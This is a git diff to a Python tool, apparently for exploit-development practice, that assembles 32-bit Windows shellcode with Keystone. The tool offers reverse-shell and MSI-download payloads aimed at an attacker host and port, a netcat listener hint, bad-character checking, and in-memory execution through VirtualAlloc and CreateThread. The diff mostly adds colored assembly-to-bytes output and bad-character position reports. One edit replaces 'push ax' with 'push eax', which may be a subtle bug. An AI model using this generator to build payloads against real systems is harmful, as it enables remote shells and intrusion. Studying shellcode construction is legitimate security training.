@@ -8,6 +8,19 @@ import keystone as ks
 import numpy
 
 
+class Color:
+    def __init__(self, disabled=False):
+        if disabled:
+            self.red = self.green = self.yellow = self.blue = ""
+            self.reset = ""
+        else:
+            self.red = "\033[31m"
+            self.green = "\033[32m"
+            self.yellow = "\033[33m"
+            self.blue = "\033[34m"
+            self.reset = "\033[0m"
+
+
 def to_hex(s):
     retval = list()
     for char in s:
@@ -44,7 +57,7 @@ def push_function_hash(function_name):
         if ror_count < len(function_name) - 1:
             edx = ror_str(edx, 0xD)
         ror_count += 1
-    return "push " + hex(edx)
+    return "       push " + hex(edx) + "                 ;"
 
 
 def push_string(input_string):
@@ -59,35 +72,33 @@ def push_string(input_string):
         if (i != 0) and ((i % 8) == 0):
             target_bytes = rev_hex_payload[i - 8 : i]
             instructions.append(
-                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};"
+                f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]}      ;"
             )
         # handle the left ofer instructions
-        elif (
-            (0 == i - 1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0
-        ):
+        elif (0 == i - 1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0:
             if rev_hex_payload_len % 8 == 2:
                 first_instructions.append(
-                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};"
+                    f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]}           ;"
                 )
-                first_instructions.append("push eax;")
+                first_instructions.append("push eax                   ;")
             elif rev_hex_payload_len % 8 == 4:
                 target_bytes = rev_hex_payload[
                     (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
                 ]
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]}             ;"
                 )
-                first_instructions.append("push eax;")
+                first_instructions.append("push eax                   ;")
             else:
                 target_bytes = rev_hex_payload[
                     (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
                 ]
-                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
-                first_instructions.append("push eax;")
+                first_instructions.append(f"mov al, 0x{target_bytes[4:6]}         ;")
+                first_instructions.append("push eax                   ;")
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]}                      ;"
                 )
-                first_instructions.append("push ax;")
+                first_instructions.append("push eax                   ;")
             null_terminated = True
 
     instructions = first_instructions + instructions
@@ -300,6 +311,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       push 0xffffffff                 ;",  # hProcess
         "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
+    asm = fix_spacing(asm)
     return "\n".join(asm)
 
 
@@ -415,6 +427,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       push 0xffffffff                 ;",  # hProcess
         "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
+    asm = fix_spacing(asm)
     return "\n".join(asm)
 
 
@@ -531,10 +544,103 @@ def msg_box(header, text, breakpoint=0):
         "       push 0xffffffff                 ;",  # hProcess
         "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
     ]
+    asm = fix_spacing(asm)
     return "\n".join(asm)
 
 
+def fix_spacing(asm_source):
+    # Check if any item has more than one instruction, if so we need to split them
+    final_asm = []
+    for item in asm_source:
+        if ";" in item:
+            split_items = item.split(";")
+            if len(split_items) > 2:
+                for split_item in split_items:
+                    if split_item.strip() != "":
+                        final_asm.append("       " + split_item + "     ;")
+            else:
+                final_asm.append(item)
+        else:
+            final_asm.append(item)
+    return final_asm
+
+
+def print_asm_lines(asm_source, eng, bad_chars, no_color=False):
+    colors = Color(disabled=no_color)
+
+    lines = [l for l in asm_source.splitlines() if l.strip()]
+
+    try:
+        # try incremental mode
+        asm_blocks = ""
+        prev_size = 0
+        full_encoding = None
+
+        for line in lines:
+            asm_blocks += line + "\n"
+            encoding, count = eng.asm(asm_blocks)  # may fail when using labels
+            if not encoding:
+                continue
+            prev_size = len(encoding)
+        full_encoding = encoding  # no error → incremental mode OK
+
+        incremental_ok = True
+
+    except ks.KsError:
+        # Code with labels → must assemble full block once
+        incremental_ok = False
+        full_encoding, count = eng.asm(asm_source)
+
+    # Now print per line slices
+    byte_index = 0
+
+    # Determine longest line for formatting
+    max_line_len = max(len(line) for line in lines)
+    col1_width = max_line_len + 6
+    print(
+        f"{colors.blue}{'[+] Shellcode assembly code'.ljust(col1_width)}Corresponding bytes{colors.reset}"
+    )
+    for line in lines:
+        enc_opcode = ""
+
+        # Assemble this single line to get its size
+        # (Keystone supports isolated-line assembly even for labels)
+        try:
+            line_enc, _ = eng.asm(line)
+            line_size = len(line_enc)
+        except ks.KsError:
+            # labels alone (e.g. "start:") assemble to nothing
+            line_size = 0
+
+        # Slice bytes
+        current = full_encoding[byte_index : byte_index + line_size]
+        byte_index += line_size
+
+        # Color bad bytes
+        for b in current:
+            hb = f"{b:02x}"
+            if hb in bad_chars:
+                enc_opcode += f"{colors.red}0x{hb}{colors.reset} "
+            else:
+                enc_opcode += f"0x{hb} "
+
+        spacer = 30 - len(line)
+        print(f"{line.ljust(col1_width)}{enc_opcode}")
+
+    # Convert bad chars to integer values
+    badvals = {int(x.replace("\\x", ""), 16) for x in bad_chars}
+
+    # Find where bad chars appear
+    bad_positions = {}
+    for idx, b in enumerate(full_encoding):
+        if b in badvals:
+            bad_positions.setdefault(b, []).append(idx)
+
+    return full_encoding, count, bad_positions
+
+
 def main(args):
+    colors = Color(disabled=args.no_color)
     help_msg = ""
     if args.msi:
         shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
@@ -551,9 +657,10 @@ def main(args):
         help_msg += f"\t Start listener:\n"
         help_msg += f"\t\t nc -lnvp {args.lport}"
 
-    print(shellcode)
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
-    encoding, count = eng.asm(shellcode)
+    encoding, count, bad_positions = print_asm_lines(
+        shellcode, eng, args.bad_chars, no_color=args.no_color
+    )
 
     final = ""
 
@@ -566,18 +673,8 @@ def main(args):
 
     final += '"'
 
-    sentry = False
-
-    for bad in args.bad_chars:
-        if bad in final:
-            print(f"[!] Found 0x{bad}")
-            sentry = True
-
-    if sentry:
-        print(f"[=] {final}", file=sys.stderr)
-        raise SystemExit("[!] Remove bad characters and try again")
-
-    print(f"[+] shellcode created!")
+    print()
+    print(f"{colors.green}[+] shellcode created!{colors.reset}")
     print(f"[=]   len:   {len(encoding)} bytes")
     print(f"[=]   lhost: {args.lhost}")
     print(f"[=]   lport: {args.lport}")
@@ -599,6 +696,18 @@ def main(args):
     print()
     print(final)
 
+    if len(bad_positions) > 0:
+        print()
+        print(f"{colors.red}[!] Bad characters found in shellcode!{colors.reset}")
+        print(f"{'Bad Char':<10}{'Positions':<25}")
+        for b in sorted(bad_positions.keys()):
+            positions = ", ".join(str(p) for p in bad_positions[b])
+            print(f"{colors.red}0x{b:02x}{colors.reset}      {positions}")
+        print()
+        raise SystemExit(
+            f"{colors.red}[!] Remove bad characters and try again{colors.reset}"
+        )
+
     if args.test_shellcode and (struct.calcsize("P") * 8) == 32:
         print(f"\n[+] Debugging shellcode ...")
         sh = b""
@@ -612,9 +721,7 @@ def main(args):
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
-        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(
-            packed_shellcode
-        )
+        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
         ctypes.windll.kernel32.RtlMoveMemory(
             ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
         )
@@ -628,9 +735,7 @@ def main(args):
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)),
         )
-        ctypes.windll.kernel32.WaitForSingleObject(
-            ctypes.c_int(ht), ctypes.c_int(-1)
-        )
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
 
 if __name__ == "__main__":
@@ -653,7 +758,7 @@ if __name__ == "__main__":
     parser.add_argument(
         "-b",
         "--bad-chars",
-        help="space separated list of bad chars to check for in final egghunter (default: 00)",
+        help="space separated list of bad chars to check for in final payload (default: 00)",
         default=["00"],
         nargs="+",
     )
@@ -687,6 +792,9 @@ if __name__ == "__main__":
         "--store-shellcode",
         help="store the shellcode in binary format in the file shellcode.bin",
         action="store_true",
+    )
+    parser.add_argument(
+        "--no-color", action="store_true", help="Disable ANSI color output"
     )
 
     args = parser.parse_args()
